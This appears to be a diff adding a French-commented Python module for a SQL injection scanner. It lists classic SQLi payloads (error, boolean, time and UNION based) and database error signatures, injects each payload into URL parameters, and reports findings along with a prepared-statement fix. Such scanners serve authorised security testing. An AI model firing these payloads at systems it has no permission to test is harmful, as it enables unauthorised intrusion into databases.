@@ -1,0 +1,195 @@
+# -*- coding: utf-8 -*-
+"""
+Scanner SQL Injection
+Teste differentes payloads SQLi sur les endpoints
+"""
+import requests
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+import re
+
+
+# Payloads SQLi classiques
+SQLI_PAYLOADS = [
+    # Error-based
+    "'",
+    "\"",
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' #",
+    "admin' --",
+    "admin' #",
+    "' OR 1=1--",
+    "' UNION SELECT NULL--",
+
+    # Boolean-based
+    "1' AND '1'='1",
+    "1' AND '1'='2",
+
+    # Time-based
+    "' OR SLEEP(5)--",
+    "' WAITFOR DELAY '0:0:5'--",
+
+    # UNION-based
+    "' UNION SELECT NULL,NULL--",
+    "' UNION ALL SELECT NULL,NULL,NULL--",
+]
+
+# Signatures d'erreurs SQL
+SQL_ERROR_SIGNATURES = [
+    # MySQL
+    r"SQL syntax.*MySQL",
+    r"Warning.*mysql_.*",
+    r"MySQLSyntaxErrorException",
+    r"valid MySQL result",
+    r"check the manual that corresponds to your (MySQL|MariaDB) server version",
+
+    # PostgreSQL
+    r"PostgreSQL.*ERROR",
+    r"Warning.*\Wpg_.*",
+    r"valid PostgreSQL result",
+    r"Npgsql\.",
+
+    # MSSQL
+    r"Driver.* SQL[\-\_\ ]*Server",
+    r"OLE DB.* SQL Server",
+    r"(\W|\A)SQL Server.*Driver",
+    r"Warning.*mssql_.*",
+    r"ODBC SQL Server Driver",
+    r"SQLServer JDBC Driver",
+    r"Unclosed quotation mark after the character string",
+
+    # Oracle
+    r"ORA-[0-9][0-9][0-9][0-9]",
+    r"Oracle error",
+    r"Oracle.*Driver",
+    r"Warning.*\Woci_.*",
+
+    # SQLite
+    r"SQLite/JDBCDriver",
+    r"SQLite.Exception",
+    r"System.Data.SQLite.SQLiteException",
+    r"Warning.*sqlite_.*",
+
+    # Generic
+    r"syntax error",
+    r"unterminated quoted string",
+    r"unexpected end of SQL command",
+]
+
+
+def test_sqli_on_url(url, method='GET', timeout=10):
+    """
+    Test SQL injection sur une URL
+    Returns: list de vulnerabilites trouvees
+    """
+    vulnerabilities = []
+
+    parsed_url = urlparse(url)
+
+    # Tester GET parameters
+    if parsed_url.query:
+        params = parse_qs(parsed_url.query)
+        for param_name in params.keys():
+            vulns = test_parameter(url, param_name, method='GET', timeout=timeout)
+            vulnerabilities.extend(vulns)
+
+    # TODO: Tester POST parameters si method='POST'
+
+    return vulnerabilities
+
+
+def test_parameter(url, param_name, method='GET', timeout=10):
+    """Test un parametre specifique avec differents payloads"""
+    vulnerabilities = []
+
+    # Requete baseline (sans payload)
+    try:
+        baseline_response = requests.get(url, timeout=timeout, verify=False)
+        baseline_text = baseline_response.text
+        baseline_length = len(baseline_text)
+    except:
+        return vulnerabilities
+
+    # Tester chaque payload
+    for payload in SQLI_PAYLOADS:
+        try:
+            parsed_url = urlparse(url)
+            params = parse_qs(parsed_url.query)
+
+            # Remplacer la valeur du parametre par le payload
+            if param_name in params:
+                params[param_name] = [payload]
+
+            # Reconstruire l'URL
+            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"
+
+            response = requests.get(test_url, timeout=timeout, verify=False)
+
+            # Detection 1: Erreurs SQL dans la reponse
+            for pattern in SQL_ERROR_SIGNATURES:
+                if re.search(pattern, response.text, re.IGNORECASE):
+                    vulnerabilities.append({
+                        'vuln_type': 'sqli',
+                        'severity': 'high',
+                        'url': url,
+                        'parameter': param_name,
+                        'method': method,
+                        'payload': payload,
+                        'evidence': extract_error_context(response.text, pattern),
+                        'description': f'SQL Injection detectee via error-based sur le parametre "{param_name}"',
+                        'recommendation': 'Utiliser des requetes parametrees (prepared statements) pour prevenir les injections SQL.'
+                    })
+                    break  # Une detection suffit pour ce payload
+
+            # Detection 2: Changement de comportement (boolean-based)
+            if "1' AND '1'='1" in payload or "' OR '1'='1" in payload:
+                length_diff = abs(len(response.text) - baseline_length)
+                if length_diff > 100:  # Difference significative
+                    vulnerabilities.append({
+                        'vuln_type': 'sqli',
+                        'severity': 'high',
+                        'url': url,
+                        'parameter': param_name,
+                        'method': method,
+                        'payload': payload,
+                        'evidence': f'Difference de taille de reponse: {length_diff} bytes',
+                        'description': f'SQL Injection detectee via boolean-based sur le parametre "{param_name}"',
+                        'recommendation': 'Utiliser des requetes parametrees (prepared statements) pour prevenir les injections SQL.'
+                    })
+
+        except Exception as e:
+            continue
+
+    return vulnerabilities
+
+
+def extract_error_context(text, pattern, context_length=200):
+    """Extrait le contexte autour d'une erreur SQL"""
+    match = re.search(pattern, text, re.IGNORECASE)
+    if match:
+        start = max(0, match.start() - context_length // 2)
+        end = min(len(text), match.end() + context_length // 2)
+        return text[start:end].strip()
+    return ""
+
+
+def scan_sqli_on_endpoints(endpoints, progress_callback=None):
+    """
+    Scan SQL Injection sur une liste d'endpoints
+    endpoints: list de dicts avec 'url' et optionnellement 'method'
+    progress_callback: fonction appelée pour mettre à jour la progression
+    """
+    all_vulnerabilities = []
+    total = len(endpoints)
+
+    for i, endpoint in enumerate(endpoints):
+        url = endpoint.get('url')
+        method = endpoint.get('method', 'GET')
+
+        if progress_callback:
+            progress_callback(i + 1, total)
+
+        vulns = test_sqli_on_url(url, method=method)
+        all_vulnerabilities.extend(vulns)
+
+    return all_vulnerabilities
